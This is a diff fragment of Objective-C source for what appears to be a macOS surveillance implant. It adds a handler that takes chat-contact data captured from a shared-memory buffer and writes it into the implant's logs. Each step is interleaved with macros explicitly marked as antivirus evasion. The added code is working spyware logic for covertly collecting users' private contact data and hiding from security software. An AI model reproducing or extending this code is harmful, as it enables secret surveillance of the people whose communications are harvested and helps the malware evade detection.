@@ -1591,6 +1591,44 @@ static void computerWillShutdown(CFMachPortRef port,
 
                 break;
               }
+            case AGENT_CHAT_CONTACT:
+              {
+                // AV evasion: only on release build
+                AV_GARBAGE_008
+                
+#ifdef DEBUG_CORE
+                verboseLog(@"Log contact from chat agent");
+#endif
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+                
+                if ([_logManager createLog: AGENT_ORGANIZER
+                               agentHeader: nil
+                                 withLogID: 0xABCD] == FALSE)
+                {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_002
+                  
+                  break;
+                }
+                
+                if ([_logManager writeDataToLog: logData
+                                       forAgent: AGENT_ORGANIZER
+                                      withLogID: 0xABCD] == FALSE)
+                {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_003
+                  
+                  break;
+                }
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_001
+                
+                [_logManager closeActiveLog: AGENT_ORGANIZER
+                                  withLogID: 0xABCD];
+                break;
+              }
             default:
               {
 #ifdef DEBUG_CORE
